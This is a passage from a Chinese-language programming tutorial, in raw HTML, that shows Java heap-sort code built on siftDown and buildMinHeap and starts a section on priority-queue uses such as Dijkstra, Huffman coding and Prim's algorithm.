place</code>的堆排序算法。</p>\n<p>具体操作如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38743a7a3232997534\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nint[] n = new int[] {1,9,5,6,8,3,1,2,5,9,86};\r\nHeap h = new Heap(n);\r\nfor (int i = 0; i &lt; n.length; i++)\r\n\tn[n.length-1-i] = h.extractMin();</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7a3232997534-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7a3232997534-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7a3232997534-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7a3232997534-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38743a7a3232997534-1\"><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">86</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7a3232997534-2\"><span class=\"crayon-i\">Heap</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">h</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Heap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7a3232997534-3\"><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7a3232997534-4\"><span class=\"crayon-h\">\t</span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">length</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">h</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">extractMin</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0021 seconds] -->\r\n<p></p>\n<hr>\n<p>当然，如果不使用前面定义的<code>heap</code>，则可以手动写堆排序，由于堆排序设计到<strong>建堆</strong>和<strong>extractMin</strong>， 两个操作都公共依赖于<code>siftDown</code>函数，因此我们只需要实现<code>siftDown</code>即可。(trick:由于建堆操作可以采用<code>siftUp</code>或者<code>siftDown</code>，而<code>extractMin</code>是需要<code>siftDown</code>操作，因此取公共部分，则采用<code>siftDown</code>建堆)。</p>\n<p>这里便于和前面统一，采用小顶堆数组进行降序排列。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38743a7a8418024243\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npublic void heapSort(int[] nums) {\r\n\t\tint size = nums.length;\r\n\t\tbuildMinHeap(nums);\r\n\t\twhile (size != 0) {\r\n\t\t\t// 交换堆顶和最后一个元素\r\n\t\t\tint tmp = nums[0];\r\n\t\t\tnums[0] = nums[size - 1];\r\n\t\t\tnums[size - 1] = tmp;\r\n\t\t\tsize--;\r\n\t\t\tsiftDown(nums, 0, size);\r\n\t\t}\r\n\t}\r\n\r\n\t// 建立小顶堆\r\n\tprivate void buildMinHeap(int[] nums) {\r\n\t\tint size = nums.length;\r\n\t\tfor (int j = size / 2 - 1; j &gt;= 0; j--)\r\n\t\t\tsiftDown(nums, j, size);\r\n\t}\r\n\r\n\tprivate void siftDown(int[] nums, int i, int newSize) {\r\n\t\tint key = nums[i];\r\n\t\twhile (i &lt; newSize &gt;&gt;&gt; 1) {\r\n\t\t\tint leftChild = (i &lt;&lt; 1) + 1;\r\n\t\t\tint rightChild = leftChild + 1;\r\n\t\t\t// 最小的孩子，比最小的孩子还小\r\n\t\t\tint min = (rightChild &gt;= newSize || nums[leftChild] &lt; nums[rightChild]) ? leftChild : rightChild;\r\n\t\t\tif (key &lt;= nums[min])\r\n\t\t\t\tbreak;\r\n\t\t\tnums[i] = nums[min];\r\n\t\t\ti = min;\r\n\t\t}\r\n\t\tnums[i] = key;\r\n\t}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7a8418024243-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7a8418024243-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7a8418024243-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7a8418024243-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7a8418024243-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7a8418024243-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7a8418024243-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7a8418024243-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7a8418024243-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7a8418024243-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7a8418024243-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7a8418024243-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7a8418024243-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7a8418024243-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7a8418024243-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7a8418024243-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7a8418024243-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7a8418024243-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7a8418024243-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7a8418024243-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7a8418024243-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7a8418024243-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7a8418024243-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7a8418024243-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7a8418024243-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7a8418024243-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7a8418024243-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7a8418024243-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7a8418024243-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7a8418024243-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7a8418024243-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7a8418024243-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a7a8418024243-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a7a8418024243-34\">34</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38743a7a8418024243-1\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">heapSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7a8418024243-2\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7a8418024243-3\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">buildMinHeap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7a8418024243-4\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7a8418024243-5\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-c\">// 交换堆顶和最后一个元素</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7a8418024243-6\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tmp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7a8418024243-7\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7a8418024243-8\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tmp</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7a8418024243-9\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">size</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7a8418024243-10\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-e\">siftDown</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7a8418024243-11\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7a8418024243-12\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7a8418024243-13\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7a8418024243-14\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 建立小顶堆</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7a8418024243-15\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">buildMinHeap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7a8418024243-16\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7a8418024243-17\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7a8418024243-18\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-e\">siftDown</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7a8418024243-19\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7a8418024243-20\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7a8418024243-21\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">siftDown</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">newSize</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7a8418024243-22\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7a8418024243-23\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">newSize</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7a8418024243-24\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">leftChild</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7a8418024243-25\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rightChild</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">leftChild</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7a8418024243-26\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-c\">// 最小的孩子，比最小的孩子还小</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7a8418024243-27\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">min</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">rightChild</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">newSize</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">||</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">leftChild</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">rightChild</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">leftChild</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rightChild</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7a8418024243-28\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">min</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7a8418024243-29\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-st\">break</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7a8418024243-30\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">min</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7a8418024243-31\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">min</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7a8418024243-32\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7a8418024243-33\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7a8418024243-34\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0069 seconds] -->\r\n<p></p>\n<h2 id=\"3-堆的应用：优先队列\">3.堆的应用：优先队列</h2>\n<p>优先队列是一种抽象的数据类型，它和堆的关系类似于，<code>List</code>和数组、链表的关系一样；我们常常使用堆来实现优先队列，因此很多时候堆和优先队列都很相似，它们只是概念上的区分。<br>\n优先队列的应用场景十分的广泛：<br>\n常见的应用有：</p>\n<ul>\n<li>Dijkstra’s algorithm（单源最短路问题中需要在邻接表中找到某一点的最短邻接边，这可以将复杂度降低。）</li>\n<li>Huffman coding（贪心算法的一个典型例子，采用优先队列构建最优的前缀编码树(<code>prefixEncodeTree</code>)）</li>\n<li>Prim’s algorithm for minimum spanning 